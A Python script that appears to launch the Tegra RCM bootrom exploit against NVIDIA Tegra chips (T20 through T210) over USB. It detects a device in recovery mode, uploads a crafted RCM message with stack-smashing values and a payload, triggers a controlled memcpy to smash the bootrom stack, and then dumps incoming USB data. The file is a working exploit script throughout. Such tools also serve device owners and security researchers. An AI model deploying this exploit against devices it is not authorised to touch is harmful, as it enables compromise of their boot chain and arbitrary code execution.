#!/usr/bin/env python3

import os
import sys
import argparse
import usb

from SoC import *

# Get a connection to our device.
NVIDIA_VID = 0x0955

T20_PIDS  = [0x7820]
T30_PIDS  = [0x7030, 0x7130, 0x7330]
T114_PIDS = [0x7335]
T124_PIDS = [0x7140, 0x7f40]
T132_PIDS = [0x7F13]
T210_PIDS = [0x7321, 0x7721]

devs = usb.core.find(find_all=1, idVendor=NVIDIA_VID)

# Automaticall choose the correct SoC based on the USB product ID.
rcm_device = None
for dev in devs:
    try:
        #print( dir(dev))
        print('VendorID=' + hex(dev.idVendor) + ' & ProductID=' + hex(dev.idProduct))
        if dev.idProduct in T20_PIDS:
            print("detected a T20")
            rcm_device = T20(vid=NVIDIA_VID, pid=dev.idProduct)
        elif dev.idProduct in T30_PIDS:
            print("detected a T30")
            rcm_device = T30(vid=NVIDIA_VID, pid=dev.idProduct)
        elif dev.idProduct in T114_PIDS:
            print("detected a T114")
            rcm_device = T114(vid=NVIDIA_VID, pid=dev.idProduct)
        elif dev.idProduct in T124_PIDS:
            print("detected a T124")
            rcm_device = T124(vid=NVIDIA_VID, pid=dev.idProduct)
        elif dev.idProduct in T132_PIDS:
            print("detected a T132")
            rcm_device = T132(vid=NVIDIA_VID, pid=dev.idProduct)
        elif dev.idProduct in T210_PIDS:
            print("detected a T210")
            rcm_device = T210(vid=NVIDIA_VID, pid=dev.idProduct)
    except IOError as e:
        print(e)
        sys.exit(-1)
    break

if rcm_device is None:
    print("No RCM device found")
    sys.exit(-1)

# Print the device's ID. Note that reading the device's ID is necessary to get it into Recovery Mode
try:
    device_id = rcm_device.read_device_id()
    print("Found a Tegra with Device ID: {}".format(device_id.hex()))
except OSError as e:
    # Raise the exception only if we're not being permissive about ID reads.
    raise e

# Construct the RCM message which contains the data needed for the exploit.
rcm_message = rcm_device.create_rcm_message()

# Send the constructed payload, which contains the command, the stack smashing
# values, the Intermezzo relocation stub, and the final payload.
print("Uploading payload...")
rcm_device.write(rcm_message)

# The RCM backend alternates between two different DMA buffers. Ensure we're
# about to DMA into the higher one, so we have less to copy during our attack.
print("Switch to highbuf...")
rcm_device.switch_to_highbuf()

# Smash the device's stack, triggering the vulnerability.
print("Smashing the stack...")
try:
    rcm_device.trigger_controlled_memcpy()
except ValueError as e:
    print(str(e))
except IOError:
    print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
    print("Launch complete!")

print("Listening to incoming USB Data:")
print("-------------------------------")
while True:
    buf = rcm_device.read(0x1000)
    print(buf.hex())
    try:
        print(buf.decode('utf-8'))
    except UnicodeDecodeError:
        pass
